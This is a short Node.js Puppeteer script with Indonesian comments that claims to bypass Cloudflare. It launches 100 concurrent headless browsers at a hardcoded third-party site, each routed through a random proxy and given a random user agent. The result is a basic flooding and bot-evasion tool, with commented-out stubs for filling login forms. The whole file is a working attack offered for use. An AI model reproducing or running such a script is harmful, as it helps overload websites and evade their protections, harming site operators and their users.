const puppeteer = require('puppeteer');
const fs = require('fs');

const targetUrl = 'https://apipc.my.id/';
const proxyListFile = 'Phong.txt';
const userAgentListFile = 'agent.txt';

const proxies = fs.readFileSync(proxyListFile, 'utf8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync(userAgentListFile, 'utf8').split('\n').filter(Boolean);

async function bypassCloudflare(url, proxy, userAgent) {
    const browser = await puppeteer.launch({
        headless: true, // Ganti jadi false kalo mau liat browsernya
        args: [
            `--proxy-server=${proxy}`,
            `--user-agent=${userAgent}`,
            '--no-sandbox', // Penting buat Linux
            '--disable-setuid-sandbox' // Juga penting buat Linux
        ],
    });

    const page = await browser.newPage();
    await page.setDefaultNavigationTimeout(60000); // Timeout 60 detik

    try {
        await page.goto(url, { waitUntil: 'networkidle2' });
        console.log('Berhasil bypass Cloudflare!');

        // Lu bisa tambahin kode di sini buat interaksi lebih lanjut, misalnya, ngisi form atau ngeklik tombol
        // await page.type('#username', 'username');
        // await page.type('#password', 'password');
        // await page.click('#login-button');

    } catch (error) {
        console.error('Gagal bypass Cloudflare:', error);
    } finally {
        await browser.close();
    }
}

async function main() {
    for (let i = 0; i < 100; i++) { // Kirim 100 request
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        bypassCloudflare(targetUrl, proxy, userAgent);
    }
}

main();
